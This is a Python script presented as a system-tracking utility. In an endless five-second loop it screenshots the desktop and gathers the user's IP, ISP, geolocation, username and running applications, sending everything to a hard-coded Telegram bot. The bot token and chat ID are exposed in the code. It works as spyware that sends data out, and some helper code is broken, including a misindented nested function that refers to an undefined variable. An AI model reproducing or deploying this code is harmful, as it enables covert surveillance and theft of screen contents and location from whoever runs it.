import os
import psutil
import time
import pyautogui
from datetime import datetime
import shutil
import hashlib
import platform
import requests
import socket
import subprocess
from PIL import ImageGrab  # Use Pillow for screenshot capturing (ImageGrab for Windows)


# Define the Telegram Bot Token and Chat ID
bot_token = '7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo'
chat_id = '5063829177'

# Function to send the screenshot
def send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    
    url = f'https://api.telegram.org/bot7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo/sendPhoto'
    
    # Send the screenshot to the chat
    with open('screenshot.png', 'rb') as photo:
        response = requests.post(url, data={'chat_id': chat_id}, files={'photo': photo})
    
    if response.status_code == 200:
        print("Screenshot sent successfully!")
# Function to get system information
def get_network_connection_type():
    # Get network interfaces (Ethernet, Wi-Fi, etc.)
    interfaces = psutil.net_if_addrs()
    connection_type = "Unknown"
    
    for interface, addrs in interfaces.items():
        for addr in addrs:
            if addr.family == socket.AF_INET:  # Corrected this line to use socket.AF_INET
                if "Wi-Fi" in interface or "wlan" in interface:
                    connection_type = "Wi-Fi"
                elif "Ethernet" in interface or "eth" in interface:
                    connection_type = "Ethernet"
                else:
                    connection_type = "Other"
                break
    return connection_type


# Function to get the disk space available
def get_disk_space():
    disk_info = psutil.disk_usage('/')
    free_space = disk_info.free / (1024 ** 3)  # Convert to GB
    total_space = disk_info.total / (1024 ** 3)  # Convert to GB
    return total_space, free_space


# Function to get the public IP address (external IP)
def get_public_ip():
    try:
        ip_info = requests.get('https://api.ipify.org').json()
        return ip_info['ip']
    except requests.RequestException:
        return "Unable to fetch public IP"


# Function to get system information
def get_system_info():
    # Get the current date and time
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Get device type (OS type)
    os_type = platform.system()
    
    # Get the IP address and ISP information
    ip_info = requests.get('https://ipinfo.io/json').json()
    ip_address = ip_info['ip']
    isp_provider = ip_info['org']
    
    # Get the current location (city, region, country)
    location = ip_info['city'] + ', ' + ip_info['region'] + ', ' + ip_info['country']
    
    # Get battery percentage
    battery = psutil.sensors_battery()
    battery_percentage = battery.percent if battery else "N/A"
    
    # Get the list of active applications (top 4)
    active_apps = [p.info for p in psutil.process_iter(attrs=['pid', 'name'])][:4]  # Limit to 4 apps
    app_names = [app['name'] for app in active_apps]
    
    # Get CPU usage (percentage)
    cpu_percent = psutil.cpu_percent(interval=1)  # Check CPU usage for 1 second
    
    # Get RAM usage (percentage)
    memory = psutil.virtual_memory()
    ram_usage = memory.percent
    
    # Get Disk usage (percentage)
    disk_usage = psutil.disk_usage('/').percent
    
    # Get the number of CPU cores
    cpu_cores = psutil.cpu_count(logical=False)  # Physical cores

    # Get the total RAM available (in GB)
    total_ram = memory.total / (1024 ** 3)  # Convert to GB

    # Get the current user
    current_user = psutil.users()[0].name if psutil.users() else "Unknown"

    # Get network connection type (Wi-Fi, Ethernet, etc.)
    network_type = get_network_connection_type()
    
    # Get disk space info
    total_disk, free_disk = get_disk_space()
    
    # Get public IP address
    public_ip = get_public_ip()

    # Get OS version
    os_version = platform.version()

    # Get Python version
    python_version = platform.python_version()
    
    # Create the info message
    info_message = f"""
    Date: {current_time}
    OS Type: {os_type}
    OS Version: {os_version}
    IP Address: {ip_address}
    Public IP: {public_ip}
    ISP: {isp_provider}
    Location: {location}
    Battery Percentage: {battery_percentage}%
    Active Apps: {', '.join(app_names)}
    CPU Usage: {cpu_percent}%
    RAM Usage: {ram_usage}%
    Disk Usage: {disk_usage}%
    Free Disk Space: {free_disk:.2f} GB of {total_disk:.2f} GB
    Total RAM: {total_ram:.2f} GB
    CPU Cores: {cpu_cores}
    Current User: {current_user}
    Network Connection: {network_type}
    Python Version: {python_version}
    """
    # Send the information message
    send_message(info_message)

# Function to send message to Telegram bot
def send_message(message):
    url = f'https://api.telegram.org/bot7999167399:AAHmmLTlADYYatlbpxH2uQgjnKNlBDc0Xwo/sendMessage'
    response = requests.post(url, data={'chat_id': chat_id, 'text': message})
    
    if response.status_code == 200:
        print("Information sent successfully!")

# Function to start tracking the activities
def start_tracking():
    try:
        while True:
            get_system_info()  # Get system info and send it
            send_screenshot()  # Send the screenshot
            time.sleep(5)  # Wait for 5 seconds (for testing)
    except KeyboardInterrupt:
        print("Tracking stopped.")

def check_for_keyloggers():
    keyloggers = ["keylogger", "logger", "spynote"]  # List of known keylogger process names
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if any(kw in process.info['name'].lower() for kw in keyloggers):
            return True
    return False

def monitor_system_health():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent
    
    if cpu_usage > 80:
        print(f"Warning: High CPU Usage - {cpu_usage}%")
    if memory_usage > 80:
        print(f"Warning: High Memory Usage - {memory_usage}%")

def backup_files():
    source_dir = "C:/Users/user/Documents"  # Example source directory
    backup_dir = f"C:/Backups/Backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    shutil.copytree(source_dir, backup_dir)
    print(f"Backup completed: {backup_dir}")
    
    def monitor_network_usage():
        net_io = psutil.net_io_counters()
    bytes_sent = net_io.bytes_sent
    bytes_recv = net_io.bytes_recv
    
    print(f"Bytes Sent: {bytes_sent} Bytes")
    print(f"Bytes Received: {bytes_recv} Bytes")

def check_file_integrity(file_path):
    initial_hash = get_file_hash(file_path)
    
    while True:
        current_hash = get_file_hash(file_path)
        if current_hash != initial_hash:
            print(f"Warning: {file_path} has been modified!")
            initial_hash = current_hash

def get_file_hash(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()
# Start tracking when the script is run
if __name__ == "__main__":
    start_tracking()
